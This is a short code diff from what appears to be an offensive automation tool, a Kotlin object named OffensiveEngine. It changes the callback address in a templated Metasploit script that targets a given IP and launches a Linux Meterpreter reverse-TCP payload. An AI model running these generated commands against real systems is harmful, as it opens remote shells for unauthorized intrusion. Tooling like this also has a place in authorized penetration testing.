@@ -149,7 +149,7 @@ object OffensiveEngine {
         return """
             use $module
             set RHOSTS $ip
-            set LHOST 10.0.0.2
+            set LHOST 172.18.11.218
             set PAYLOAD linux/x64/meterpreter/reverse_tcp
             run -j
             exit
